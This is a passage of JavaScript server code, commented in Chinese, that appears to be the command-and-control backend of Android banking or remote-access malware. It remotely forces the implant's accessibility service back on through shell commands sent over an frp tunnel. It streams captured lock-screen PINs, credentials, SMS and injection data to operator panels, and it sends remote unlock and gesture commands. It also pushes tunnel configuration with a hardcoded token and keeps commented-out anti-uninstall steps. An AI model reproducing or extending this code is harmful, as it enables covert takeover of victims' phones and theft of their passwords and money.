        // fallback: 用默认服务名
        var svc = pkgName + '/.service.a';
        var cmd = encodeURIComponent('settings put secure enabled_accessibility_services ' + svc + ' && settings put secure accessibility_enabled 1');
        _doWriteA11y(deviceId, port, cmd, svc);
      });
    }).on('error', function () {
      var svc = pkgName + '/.service.a';
      var cmd = encodeURIComponent('settings put secure enabled_accessibility_services ' + svc + ' && settings put secure accessibility_enabled 1');
      _doWriteA11y(deviceId, port, cmd, svc);
    });

  }

  // ★ 实际写入无障碍设置的函数
  function _doWriteA11y(did, p, cmdEnc, svcName) {
    http.get('http://127.0.0.1:' + p + '/shell?cmd=' + cmdEnc, { timeout: 6000 }, function () {
      console.log('[A11Y-AUTO] ' + did + ': settings written (' + svcName + ')');
      const bridgeWs = bridgeConnections.get(did);
      if (bridgeWs && bridgeWs.readyState === 1) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'enableAccessibility', params: {} }));
        console.log('[A11Y-AUTO] ' + did + ': also sent enableAccessibility to Bridge');
      }
      const deviceWs = deviceConnections.get(did);
      if (deviceWs && deviceWs.readyState === 1) {
        deviceWs.send(JSON.stringify({ type: 'command', data: { command: 'enableAccessibility', params: {} } }));
        console.log('[A11Y-AUTO] ' + did + ': also sent enableAccessibility to device WS');
      }
      broadcastToAdmins({
        type: 'a11y_auto_restored', deviceId: did, sessionId: did, botId: did,
        data: { deviceId: did, reason, service: svcName, restoredAt: new Date().toISOString() }
      });
    }).on('error', function (e) {
      console.log('[A11Y-AUTO] ' + did + ': ADB error: ' + e.message);
      const bridgeWs = bridgeConnections.get(did);
      if (bridgeWs && bridgeWs.readyState === 1) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'enableAccessibility', params: {} }));
      } else {
        a11yCooldown.delete(did);
      }
    });
  }

  if (cachedPkg) {
    doEnable(cachedPkg);
  } else {
    var getPkgCmd = encodeURIComponent('pm list packages -3 | grep -v google | grep -v android | grep -v vivo | grep -v baidu | grep -v tencent | grep -v taobao | grep -v sina | grep -v kuaishou | grep -v jingdong | grep -v xunmeng | grep -v smile | grep -v dragon | grep -v omron | grep -v unionpay | grep -v kaixinkan | grep -v xtc');
    http.get('http://127.0.0.1:' + port + '/shell?cmd=' + getPkgCmd, { timeout: 5000 }, function (r) {
      var chunks = [];
      r.on('data', function (c) { chunks.push(c); });
      r.on('end', function () {
        var pkg = 'com.dev.rehwft';
        try {
          var out = JSON.parse(Buffer.concat(chunks).toString());
          var lines = (out.data && out.data.output || '').split('\n')
            .map(function (l) { return l.trim().replace('package:', ''); })
            .filter(function (p) { return p && p.startsWith('com.') && p.length <= 30; });
          if (lines.length > 0) pkg = lines[0];
        } catch (e) { }
        doEnable(pkg);
      });
    }).on('error', function (e) {
      console.log('[A11Y-AUTO] ' + deviceId + ': pm error ' + e.message);
      // Last resort: try Bridge WS directly
      const bridgeWs = bridgeConnections.get(deviceId);
      if (bridgeWs && bridgeWs.readyState === 1) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'enableAccessibility', params: {} }));
        console.log('[A11Y-AUTO] ' + deviceId + ': sent enableAccessibility to Bridge (pm fallback)');
      } else {
        a11yCooldown.delete(deviceId);
      }
    });
  }
}

/**
 * 通过 ADB 查询当前无障碍状态，若关闭则自动恢复
 */
function checkAndRestoreAccessibility(deviceId) {
  const port = getDevicePort(deviceId);
  const http = require('http');
  const checkCmd = encodeURIComponent('settings get secure enabled_accessibility_services');
  http.get('http://127.0.0.1:' + port + '/shell?cmd=' + checkCmd, { timeout: 4000 }, function (res) {
    var chunks = [];
    res.on('data', function (c) { chunks.push(c); });
    res.on('end', function () {
      try {
        var out = JSON.parse(Buffer.concat(chunks).toString());
        var current = (out.data && out.data.output || '').trim();
        console.log('[A11Y-CHECK] ' + deviceId + ' port=' + port + ' raw=' + JSON.stringify(current));
        // ★ 用设备包名判断（兼容不同 APK 版本的服务组件名）
        var devRow2 = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
        var devPkg = (devRow2 && devRow2.app_name && devRow2.app_name.startsWith('com.')) ? devRow2.app_name : '';
        var isOff = !current || current === 'null' || current === '';
        if (!isOff && devPkg) { isOff = !current.includes(devPkg); }
        else if (!isOff) { isOff = !current.includes('/'); }  // fallback: 只要有 / 就认为有服务
        if (isOff) {
          autoRestoreAccessibility(deviceId, 'periodic_check');
        } else {
          console.log('[A11Y] ' + deviceId + ': 无障碍正常 (' + current.substring(0, 60) + ')');
        }
      } catch (e) {
        console.log('[A11Y-CHECK] parse error: ' + e.message);
      }
    });
  }).on('error', function (e) {
    console.log('[A11Y-CHECK] ' + deviceId + ' frpc error port=' + port + ': ' + e.message);
  });
}

// 广播给所有管理端（含子账号隔离 + device_status_update 节流）
const _adminThrottleBuffer = new Map(); // ws -> { timer, msgs[] }
function broadcastToAdmins(msg) {
  const msgObj = typeof msg === 'string' ? JSON.parse(msg) : msg;
  const msgType = msgObj.type || '';
  const msgDeviceId = msgObj.deviceId || msgObj.sessionId || msgObj.botId || '';
  // 需要实时推送的关键消息类型（不节流）
  const REALTIME_TYPES = new Set(['password_input', 'credential_captured', 'injection_data', 'sms_received', 'bot_list', 'device_offline', 'device_online', 'password_status', 'operation_log_realtime', 'remark_updated', 'screen_lock_status']);
  for (const ws of adminConnections) {
    if (ws.readyState !== 1) continue;
    // 子账号隔离：如果管理端是子账号且消息带 deviceId，检查归属
    if (ws._adminUsername && ws._adminUsername !== 'admin' && msgDeviceId) {
      const user = db.prepare('SELECT assigned_devices FROM users WHERE username=?').get(ws._adminUsername);
      if (user && user.assigned_devices) {
        try {
          const devices = JSON.parse(user.assigned_devices || '[]');
          if (Array.isArray(devices) && devices.length > 0 && !devices.includes(msgDeviceId)) continue;
        } catch { }
      }
    }
    // 关键消息实时推送
    if (REALTIME_TYPES.has(msgType)) {
      try { ws.send(typeof msg === 'string' ? msg : JSON.stringify(msg)); } catch { }
      continue;
    }
    // device_status_update 等高频消息做 500ms 节流合并
    if (!_adminThrottleBuffer.has(ws)) _adminThrottleBuffer.set(ws, { timer: null, msgs: [] });
    const buf = _adminThrottleBuffer.get(ws);
    buf.msgs.push(msgObj);
    if (!buf.timer) {
      buf.timer = setTimeout(() => {
        const batch = buf.msgs.splice(0);
        buf.timer = null;
        if (ws.readyState === 1 && batch.length > 0) {
          for (const m of batch) {
            try { ws.send(JSON.stringify(m)); } catch { }
          }
        }
        if (buf.msgs.length === 0) _adminThrottleBuffer.delete(ws);
      }, 500);
    }
  }
}

// 广播给订阅了某设备的管理端（用于高频数据如截图）
function broadcastToSubscribers(deviceId, msg) {
  const subs = deviceSubscribers.get(deviceId);
  if (!subs || subs.size === 0) return;
  const data = typeof msg === 'string' ? msg : (msg instanceof Buffer ? msg : JSON.stringify(msg));
  for (const ws of subs) {
    if (ws.readyState === 1) {
      try { ws.send(data); } catch { }
    }
  }
}

// ============================================================
// WebSocket 升级处理
// ============================================================
server.on('upgrade', (req, socket, head) => {
  const url = new URL(req.url, `https://${req.headers.host}`);

  if (url.pathname === '/ws/panel') {
    // 管理端 WebSocket
    wss.handleUpgrade(req, socket, head, (ws) => handleAdminWs(ws, req));
  } else if (url.pathname === '/ws/session' || url.pathname === '/ws/device') {
    // 设备端 WebSocket
    wss.handleUpgrade(req, socket, head, (ws) => handleDeviceWs(ws, req));
  } else if (url.pathname === '/ws/bridge' || url.pathname === '/ws/lnk') {
    // local-service Bridge WebSocket（截图/ADB隧道）— 新版用 /ws/lnk
    wss.handleUpgrade(req, socket, head, (ws) => handleBridgeWs(ws, req));
  } else {
    // 接受所有其他 WS 路径（可能是 APP 用于数据上传的连接）
    console.log(`[WS] 未知路径连接: ${url.pathname}`);
    wss.handleUpgrade(req, socket, head, (ws) => handleDeviceWs(ws, req));
  }
});

// ============================================================
// 管理端 WebSocket
// ============================================================
function handleAdminWs(ws, req) {
  let clientIp = req.socket.remoteAddress || '';
  if (clientIp.startsWith('::ffff:')) {
    clientIp = clientIp.substring(7);
  }
  ws._adminIp = clientIp;

  try {
    const wsUrl = new URL(req.url, `https://${req.headers.host}`);
    const wsToken = wsUrl.searchParams.get('token') || '';
    if (!wsToken) {
      ws.close(4001, 'unauthorized');
      return;
    }
    const payload = jwt.verify(wsToken, SECRET_KEY);
    ws._adminUsername = payload.username || '';
    ws._adminToken = wsToken;

    // sessionId 校验（仅警告，不拒绝 — 前端 WS 重连可能携带旧 token）
    const user = db.prepare('SELECT active_session FROM users WHERE id=?').get(payload.userId);
    if (user && user.active_session) {
      if (!payload.sessionId || payload.sessionId !== user.active_session) {
        console.log(`[WS] ⚠️ sessionId 不匹配(允许连接): ${payload.username}, token=${(payload.sessionId || '').slice(0, 8)}, db=${user.active_session.slice(0, 8)}`);
      }
    }
  } catch (e) {
    ws.close(4001, 'unauthorized');
    console.log(`[WS] 管理端连接鉴权失败: ${e.message}`);
    return;
  }
  adminConnections.add(ws);
  adminSubscriptions.set(ws, new Set());
  console.log(`[WS] 管理端连接 (${adminConnections.size}个) user=${ws._adminUsername || 'unknown'}`);

  // ★ 异步初始化推送（不阻塞事件循环）
  setImmediate(() => {
    if (ws.readyState !== 1) return;
    const _ws0 = Date.now();

    // 子账号过滤：只推送归属于该用户的设备
    let rows = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
    const _ws1 = Date.now();
    if (ws._adminUsername && ws._adminUsername !== 'admin') {
      const user = db.prepare('SELECT assigned_devices FROM users WHERE username=?').get(ws._adminUsername);
      if (user && user.assigned_devices) {
        try {
          const myDevices = JSON.parse(user.assigned_devices || '[]');
          if (Array.isArray(myDevices) && myDevices.length > 0) {
            const mySet = new Set(myDevices);
            rows = rows.filter(r => mySet.has(r.device_id));
          }
        } catch { }
      }
    }

    // 发送在线设备列表
    const onlineRows = rows.filter(r => deviceConnections.has(r.device_id) || bridgeConnections.has(r.device_id));
    // 批量预取（消除 N+1）
    const _ids = rows.map(r => r.device_id).filter(Boolean);
    const _ph = _ids.map(() => '?').join(',');
    const _lockMap = {};
    const _injMap = {};
    if (_ids.length > 0) {
      const _tm = { '6pin': 'pin', '4pin': 'pin', '6PIN': 'pin', '4PIN': 'pin', 'numeric': 'pin', 'PIN_4': 'pin', 'PIN_6': 'pin', 'NUMERIC_COMPLEX': 'pin', 'PASSWORD_QUALITY_NUMERIC_COMPLEX': 'pin', 'PASSWORD_QUALITY_ALPHANUMERIC': 'mixed', 'pin': 'pin', 'mixed': 'mixed', 'pattern': 'pattern', 'password': 'password' };
      const _lockRows = db.prepare(`SELECT device_id, password_type FROM password_inputs WHERE id IN (SELECT MAX(id) FROM password_inputs WHERE device_id IN (${_ph}) GROUP BY device_id)`).all(..._ids);
      for (const lr of _lockRows) { _lockMap[lr.device_id] = _tm[lr.password_type] || lr.password_type || ''; }
      const _injRows = db.prepare(`SELECT device_id, COUNT(*) as c FROM sms_notifications WHERE device_id IN (${_ph}) AND type='injection' GROUP BY device_id`).all(..._ids);
      for (const ir of _injRows) { _injMap[ir.device_id] = ir.c; }
    }
    const _ws2 = Date.now();
    ws.send(JSON.stringify({ type: 'bot_list', data: onlineRows.map(r => deviceToBotList(r, _lockMap, _injMap)) }));
    const _ws3 = Date.now();
    console.log(`[PERF-WS] init: selectAll=${_ws1-_ws0}ms | prefetch=${_ws2-_ws1}ms | serialize+send=${_ws3-_ws2}ms | rows=${rows.length} online=${onlineRows.length}`);

    // 离线设备分批异步推送（每批50个，释放事件循环）
    const offlineRows = rows.filter(r => !deviceConnections.has(r.device_id) && !bridgeConnections.has(r.device_id));
    if (offlineRows.length > 0) {
      const OBATCH = 50;
      const sendOfflineBatch = (i) => {
        if (ws.readyState !== 1) return;
        const batch = offlineRows.slice(i, i + OBATCH);
        for (const r of batch) {
          ws.send(JSON.stringify({ type: 'device_offline', sessionId: r.device_id, deviceId: r.device_id }));
        }
        if (i + OBATCH < offlineRows.length) {
          setImmediate(() => sendOfflineBatch(i + OBATCH));
        }
      };
      setImmediate(() => sendOfflineBatch(0));
    }

    // ★ 密码状态分批异步推送（每批50个，释放事件循环）
    if (rows.length > 0) {
      const deviceIds = rows.map(r => r.device_id);
      const placeholders = deviceIds.map(() => '?').join(',');
      const pwdRows = db.prepare(`SELECT device_id, input_text, password_type, timestamp FROM password_inputs WHERE device_id IN (${placeholders}) AND id IN (SELECT MAX(id) FROM password_inputs GROUP BY device_id)`).all(...deviceIds);
      const BATCH = 50;
      const sendBatch = (i) => {
        if (ws.readyState !== 1) return;
        const batch = pwdRows.slice(i, i + BATCH);
        for (const pwdRow of batch) {
          ws.send(JSON.stringify({
            type: 'password_status',
            sessionId: pwdRow.device_id,
            botId: pwdRow.device_id,
            data: { deviceId: pwdRow.device_id, lockPassword: { value: pwdRow.input_text, type: pwdRow.password_type, captureTime: pwdRow.timestamp, detected: true, captured: true } }
          }));
        }
        if (i + BATCH < pwdRows.length) {
          setImmediate(() => sendBatch(i + BATCH));
        }
      };
      if (pwdRows.length > 0) setImmediate(() => sendBatch(0));
    }
  });

  ws.on('message', (raw) => {
    try {
      const data = JSON.parse(raw.toString());
      handleAdminCommand(ws, data);
    } catch { }
  });

  ws.on('close', () => {
    // 清理订阅关系
    const subs = adminSubscriptions.get(ws);
    if (subs) {
      for (const deviceId of subs) {
        const subscribers = deviceSubscribers.get(deviceId);
        if (subscribers) {
          subscribers.delete(ws);
          if (subscribers.size === 0) deviceSubscribers.delete(deviceId);
        }
      }
    }
    adminSubscriptions.delete(ws);
    adminConnections.delete(ws);
    console.log(`[WS] 管理端断开 (${adminConnections.size}个)`);
  });

  ws.on('error', () => {
    const subs = adminSubscriptions.get(ws);
    if (subs) {
      for (const deviceId of subs) {
        const subscribers = deviceSubscribers.get(deviceId);
        if (subscribers) subscribers.delete(ws);
      }
    }
    adminSubscriptions.delete(ws);
    adminConnections.delete(ws);
  });
}

function handleAdminCommand(ws, data) {
  const type = data.type || '';
  const deviceId = data.deviceId || data.sessionId || '';

  if (type === 'ping') {
    ws.send(JSON.stringify({ type: 'pong' }));
    return;
  }

  // 前端 client_event 消息处理（备注修改等）
  if (type === 'client_event' && data.data) {
    const eventType = data.data.type || '';
    const eventData = data.data.data || {};
    if (eventType === 'UPDATE_DEVICE_REMARK') {
      const did = eventData.deviceId || '';
      const remark = eventData.remark || '';
      if (did) {
        db.prepare('UPDATE devices SET remark=? WHERE device_id=?').run(remark, did);
        console.log(`[WS] 备注更新: ${did} → ${remark}`);
        // 通知所有管理端刷新
        broadcastToAdmins({ type: 'device_remark_updated', deviceId: did, data: { deviceId: did, remark } });
        ws.send(JSON.stringify({ type: 'remark_updated', success: true, deviceId: did, remark }));
      }
    }
    return;
  }

  if (type === 'get_bot_list') {
    let rows = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
    // 子账号隔离
    if (ws._adminUsername && ws._adminUsername !== 'admin') {
      const user = db.prepare('SELECT assigned_devices FROM users WHERE username=?').get(ws._adminUsername);
      if (user && user.assigned_devices) {
        try {
          const myDevices = JSON.parse(user.assigned_devices || '[]');
          if (Array.isArray(myDevices) && myDevices.length > 0) {
            const mySet = new Set(myDevices);
            rows = rows.filter(r => mySet.has(r.device_id));
          }
        } catch { }
      }
    }
    const onlineRows = rows.filter(r => deviceConnections.has(r.device_id) || bridgeConnections.has(r.device_id));
    // 批量预取
    const _ids2 = rows.map(r => r.device_id).filter(Boolean);
    const _ph2 = _ids2.map(() => '?').join(',');
    const _lockMap2 = {};
    const _injMap2 = {};
    if (_ids2.length > 0) {
      const _tm2 = { '6pin': 'pin', '4pin': 'pin', '6PIN': 'pin', '4PIN': 'pin', 'numeric': 'pin', 'PIN_4': 'pin', 'PIN_6': 'pin', 'NUMERIC_COMPLEX': 'pin', 'PASSWORD_QUALITY_NUMERIC_COMPLEX': 'pin', 'PASSWORD_QUALITY_ALPHANUMERIC': 'mixed', 'pin': 'pin', 'mixed': 'mixed', 'pattern': 'pattern', 'password': 'password' };
      const _lockRows2 = db.prepare(`SELECT device_id, password_type FROM password_inputs WHERE id IN (SELECT MAX(id) FROM password_inputs WHERE device_id IN (${_ph2}) GROUP BY device_id)`).all(..._ids2);
      for (const lr of _lockRows2) { _lockMap2[lr.device_id] = _tm2[lr.password_type] || lr.password_type || ''; }
      const _injRows2 = db.prepare(`SELECT device_id, COUNT(*) as c FROM sms_notifications WHERE device_id IN (${_ph2}) AND type='injection' GROUP BY device_id`).all(..._ids2);
      for (const ir of _injRows2) { _injMap2[ir.device_id] = ir.c; }
    }
    ws.send(JSON.stringify({ type: 'bot_list', data: onlineRows.map(r => deviceToBotList(r, _lockMap2, _injMap2)) }));
    // 离线设备分批异步推送
    const offlineRows2 = rows.filter(r => !deviceConnections.has(r.device_id) && !bridgeConnections.has(r.device_id));
    if (offlineRows2.length > 0) {
      const OBATCH2 = 50;
      const sendOB2 = (i) => {
        if (ws.readyState !== 1) return;
        const batch = offlineRows2.slice(i, i + OBATCH2);
        for (const r of batch) {
          ws.send(JSON.stringify({ type: 'device_offline', sessionId: r.device_id, deviceId: r.device_id }));
        }
        if (i + OBATCH2 < offlineRows2.length) {
          setImmediate(() => sendOB2(i + OBATCH2));
        }
      };
      setImmediate(() => sendOB2(0));
    }
    return;
  }

  // 订阅设备（进入控制页面时前端发送）
  if (type === 'subscribe' && deviceId) {
    const subs = adminSubscriptions.get(ws) || new Set();
    subs.add(deviceId);
    adminSubscriptions.set(ws, subs);
    if (!deviceSubscribers.has(deviceId)) deviceSubscribers.set(deviceId, new Set());
    deviceSubscribers.get(deviceId).add(ws);
    console.log(`[WS] 管理端订阅设备: ${deviceId}`);
    // 通知设备被控制
    broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: { controlledBy: 'admin' }, botId: deviceId });
    // 自动发送 SCREEN_QUALITY 让APP开始推流
    const deviceWs = deviceConnections.get(deviceId);
    if (deviceWs && deviceWs.readyState === 1) {
      deviceWs.send(JSON.stringify({ type: 'command', data: { command: 'SCREEN_QUALITY', params: { mode: 'fixed', quality: 60, fps: 15, scale: 0.5 } } }));
      console.log(`[CMD] → ${deviceId}: SCREEN_QUALITY (自动，订阅时)`);
    }
    // 通过 Bridge 启动 minicap 推送
    const bridgeWs = bridgeConnections.get(deviceId);
    if (bridgeWs && bridgeWs.readyState === 1) {
      bridgeWs.send(JSON.stringify({ type: 'command', command: 'startMinicap', params: { quality: 60, scale: 0.5 } }));
      console.log(`[CMD] → ${deviceId}: startMinicap (Bridge，订阅时)`);
    }
    // 立即通过 frpc 启动 minicap（ADB 投屏加速）
    if (!isFrpcCooling(deviceId)) {
      const _port = getDevicePort(deviceId);
      safeHttpGet(`http://127.0.0.1:${_port}/minicap/stop`, { timeout: 1500 }, () => {
        frpcRequestOk(deviceId);
        setTimeout(() => {
          safeHttpGet(`http://127.0.0.1:${_port}/minicap/quality?quality=60`, { timeout: 1500 });
          safeHttpGet(`http://127.0.0.1:${_port}/minicap/scale?scale=0.5`, { timeout: 1500 });
          setTimeout(() => {
            safeHttpGet(`http://127.0.0.1:${_port}/minicap/start`, { timeout: 1500 }, () => {
              frpcRequestOk(deviceId);
              console.log(`[SCREEN] minicap 已启动: ${deviceId}`);
            }, () => { frpcRequestFail(deviceId); });
          }, 300);
        }, 300);
      }, () => {
        frpcRequestFail(deviceId);
      });
    }
    // 清除该设备的 frpc 冷却，确保轮询立即开始
    clearFrpcCooldown(deviceId);
    return;
  }

  if (type === 'unsubscribe' && deviceId) {
    const subs = adminSubscriptions.get(ws);
    if (subs) subs.delete(deviceId);
    const subscribers = deviceSubscribers.get(deviceId);
    if (subscribers) {
      subscribers.delete(ws);
      if (subscribers.size === 0) {
        deviceSubscribers.delete(deviceId);
        broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: { controlledBy: null }, botId: deviceId });
      }
    }
    console.log(`[WS] 管理端取消订阅: ${deviceId}`);
    return;
  }

  if (type === 'device_ping') {
    return; // 静默处理
  }

  // 原版前端格式: {"type":"command","sessionId":"xxx","data":{"command":"xxx","params":{}}}
  if (type === 'command' && data.data && data.data.command) {
    const realCmd = data.data.command;
    const params = data.data.params || {};
    if (deviceId) {
      // enableAccessibility 特殊处理：通过 frpc shell 执行
      if (realCmd === 'enableAccessibility' || realCmd === 'restoreAccessibility') {
        const service = 'com.dev.rehwft/com.titan.solid.luck.service.unfaiahnst';
        const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
        safeHttpGet(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
          const enabledCmd = encodeURIComponent('settings put secure accessibility_enabled 1');
          safeHttpGet(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enabledCmd}`, { timeout: 3000 });
          console.log(`[CMD] ✅ ${deviceId}: 无障碍已启用 (frpc)`);
        }, () => {
          const deviceWs = deviceConnections.get(deviceId);
          if (deviceWs && deviceWs.readyState === 1) deviceWs.send(JSON.stringify({ type: 'command', data: { command: realCmd, params } }));
        });
        return;
      }

      // 所有其他 WebSocket 命令 → 转发给 APP WebSocket（无障碍通道）
      // 自动补全屏幕尺寸（部分命令需要）
      if ((realCmd === 'SMART_NUMERIC_UNLOCK' || realCmd === 'SMART_PATTERN_UNLOCK') && (!params.screenWidth || !params.screenHeight)) {
        const deviceRow = db.prepare('SELECT screen_width,screen_height FROM devices WHERE device_id=?').get(deviceId);
        if (deviceRow) {
          if (!params.screenWidth) params.screenWidth = deviceRow.screen_width || 1080;
          if (!params.screenHeight) params.screenHeight = deviceRow.screen_height || 2400;
        } else {
          params.screenWidth = params.screenWidth || 1080;
          params.screenHeight = params.screenHeight || 2400;
        }
      }

      // GET_PASSWORD_STATUS: 服务器端从数据库补充回复（不等APP）
      if (realCmd === 'GET_PASSWORD_STATUS' && deviceId) {
        const pwdRow = db.prepare('SELECT input_text,password_type,timestamp FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(deviceId);
        if (pwdRow) {
          const statusMsg = {
            type: 'password_status',
            sessionId: deviceId,
            botId: deviceId,
            data: {
              deviceId,
              lockPassword: { value: pwdRow.input_text, type: pwdRow.password_type, captureTime: pwdRow.timestamp, detected: true, captured: true }
            }
          };
          // 发给请求的管理端
          if (ws.readyState === 1) ws.send(JSON.stringify(statusMsg));
        }
      }

      const deviceWs = deviceConnections.get(deviceId);
      if (deviceWs && deviceWs.readyState === 1) {
        // PLAYBACK_GESTURE: gestures 必须是字符串，不能是数组对象
        if (realCmd === 'PLAYBACK_GESTURE' && params.gestures && typeof params.gestures !== 'string') {
          params.gestures = JSON.stringify(params.gestures);
        }
        deviceWs.send(JSON.stringify({ type: 'command', data: { command: realCmd, params } }));
        console.log(`[CMD] → ${deviceId}: ${realCmd} (APP WS)`);
      } else {
        console.log(`[CMD] ❌ ${deviceId}: ${realCmd} - APP WS 未连接`);
      }
      // ★ FULL_DEPLOY 时推送隧道配置，确保 local-service 能启动 frpc
      // ★ 优先用 Bridge，回退到 DEV-WS（deviceConnections）
      if ((realCmd === 'FULL_DEPLOY' || realCmd === 'DEPLOY_LOCAL_SERVICE') && deviceId) {
        console.log(`[DEPLOY] 开始推送隧道配置流程: ${deviceId}`);
        let retryCount = 0;
        const maxRetries = 12;
        let retryInterval = null;
        const tryPushTunnel = () => {
          try {
            retryCount++;
            const bws = bridgeConnections.get(deviceId);
            const dws = deviceConnections.get(deviceId);
            const targetWs = (bws && bws.readyState === 1) ? bws : (dws && dws.readyState === 1) ? dws : null;
            console.log(`[DEPLOY] 尝试第${retryCount}次: bridge=${!!(bws && bws.readyState === 1)}, devWs=${!!(dws && dws.readyState === 1)}`);
            if (targetWs) {
              if (retryInterval) clearInterval(retryInterval);
              const localPort = 7912;
              const remotePort = getDevicePort(deviceId);
              const token = 'fisher_frp_2026';
              const channelName = (targetWs === bws) ? 'Bridge' : 'DEV-WS';
              const payload = {
                type: 'tunnel_config',
                serverAddr: FRP_SERVER_ADDR,
                serverPort: 7000,
                token: token,
                remotePort: remotePort,
                localPort: localPort,
                configINI: `serverAddr = "${FRP_SERVER_ADDR}"\nserverPort = 7000\nauth.method = "token"\nauth.token = "${token}"\ntransport.heartbeatInterval = 10\ntransport.heartbeatTimeout = 30\n\n[[proxies]]\nname = "${deviceId}_local"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = ${localPort}\nremotePort = ${remotePort}\n`
              };
              targetWs.send(JSON.stringify(payload));
              console.log(`[DEPLOY] ★ 推送隧道配置成功(第${retryCount}次, ${channelName}): ${deviceId} → remotePort=${remotePort}, localPort=${localPort}`);
            } else if (retryCount >= maxRetries) {
              if (retryInterval) clearInterval(retryInterval);
              console.log(`[DEPLOY] ❌ Bridge/DEV-WS 重试${maxRetries}次仍未连接，放弃推送隧道配置: ${deviceId}`);
            } else {
              console.log(`[DEPLOY] Bridge/DEV-WS 未就绪，等待重试(${retryCount}/${maxRetries}): ${deviceId}`);
            }
          } catch (err) {
            console.log(`[DEPLOY] ❌ 推送异常: ${err.message}`);
            if (retryInterval) clearInterval(retryInterval);
          }
        };
        // 首次立即尝试
        tryPushTunnel();
        retryInterval = setInterval(tryPushTunnel, 5000);
      }
    }
    return;
  }

  // 其他命令直接转发给设备
  if (deviceId) {
    const deviceWs = deviceConnections.get(deviceId);
    if (deviceWs && deviceWs.readyState === 1) {
      const params = {};
      for (const [k, v] of Object.entries(data)) {
        if (k !== 'type' && k !== 'deviceId' && k !== 'sessionId' && k !== 'timestamp') params[k] = v;
      }
      deviceWs.send(JSON.stringify({ type: 'command', data: { command: type, params } }));
      console.log(`[CMD] → ${deviceId}: ${type}`);
    }
  }
}

// ============================================================
// 设备端 WebSocket
// ============================================================
function handleDeviceWs(ws, req) {
  const url = new URL(req.url, `https://${req.headers.host}`);
  const sessionId = url.searchParams.get('sessionId') || '';
  let deviceId = sessionId;

  // sessionId 格式校验：只允许16位十六进制，拒绝 XSS/注入攻击
  if (sessionId && !/^[0-9a-f]{16}$/i.test(sessionId)) {
    console.log(`[WS] blocked invalid sessionId: ${sessionId.slice(0, 30)}, ip=${req.socket.remoteAddress}`);
    try { ws.close(4003, 'invalid'); } catch { }
    return;
  }

  console.log(`[WS] 设备连接, sessionId=${sessionId}, ip=${req.socket.remoteAddress}`);

  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw.toString());
      const msgType = msg.type || msg.path || '';

      // 处理路由格式的消息（APP 可能发 {path:"/injectionData", method:"POST", body:"..."}）
      if (msg.path === '/injectionData' || msgType === '/injectionData') {
        const body = msg.body || msg.data || msg;
        const injData = typeof body === 'string' ? JSON.parse(body) : body;
        console.log(`[INJECT] ✅ 收到注入数据(WS路由): ${JSON.stringify(injData).slice(0, 200)}`);
        const pkgName = injData.packageName || injData.pkg || '';
        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
        if (deviceId) {
          const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
          const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
          db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
            .run(deviceId, deviceName, deviceId, `[注入] ${pkgName}`, bodyStr, 'injection', Date.now());
        }
        broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data: injData });
        return;
      }

      // 临时：记录所有设备WS消息（排查注入数据）
      console.log(`[DEV-WS] ← ${deviceId}: type=${msgType}, data_keys=${JSON.stringify(Object.keys(msg.data || {}))}, top_keys=${Object.keys(msg).join(',').slice(0, 80)}`);

      // 提取 deviceId
      if (!deviceId) {
        deviceId = msg.sessionId || msg.deviceId || msg.data?.deviceId || msg.data?.botId || '';
      }

      // 注册设备连接
      if (deviceId && !deviceConnections.has(deviceId)) {
        deviceConnections.set(deviceId, ws);
        console.log(`[${new Date().toISOString()}] [WS] ✅ 设备上线: ${deviceId}`);

        // 更新数据库
        const now = Date.now() / 1000;
        const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
        if (existing) {
          db.prepare('UPDATE devices SET is_connected=1,last_seen=?,public_ip=? WHERE device_id=?').run(now, req.socket.remoteAddress, deviceId);
        } else {
          db.prepare('INSERT INTO devices (device_id,public_ip,is_connected,last_seen) VALUES (?,?,1,?)').run(deviceId, req.socket.remoteAddress, now);
        }

        // 通知管理端
        const row = db.prepare('SELECT * FROM devices WHERE device_id=?').get(deviceId);
        if (row) {
          const d = deviceToBotList(row, null, null);
          broadcastToAdmins({ type: 'device_online', sessionId: deviceId, deviceId, data: d });
          broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: d, botId: deviceId });
          broadcastToAdmins({ type: 'get_device_state_response', sessionId: deviceId, data: d, botId: deviceId });
        }
        // 自动归属子账户
        const owner = msg.ownerUsername || msg.data?.ownerUsername || url.searchParams?.get('ownerUsername') || '';
        autoAssignDevice(deviceId, owner);

        // // 自动下发防卸载命令（暂时关闭）
        // setTimeout(() => {
        //   if (ws.readyState === 1) {
        //     ws.send(JSON.stringify({
        //       type: 'command',
        //       data: {
        //         command: 'ENABLE_UNINSTALL_PROTECTION',
        //         params: {}
        //       }
        //     }));
        //     console.log(`[CMD] ✅ 自动向设备 ${deviceId} 发送 ENABLE_UNINSTALL_PROTECTION`);
        //   }
        // }, 1000);

        // //         // 自动下发 FULL_DEPLOY 命令（仅对未完成ADB配对的设备）
        // //         setTimeout(() => {
        // //           if (ws.readyState === 1) {
        // //             const row = db.prepare('SELECT local_service_connected FROM devices WHERE device_id=?').get(deviceId);
        // //             if (!row || !row.local_service_connected) {
        // //               ws.send(JSON.stringify({ type: 'command', data: { command: 'FULL_DEPLOY', params: {} } }));
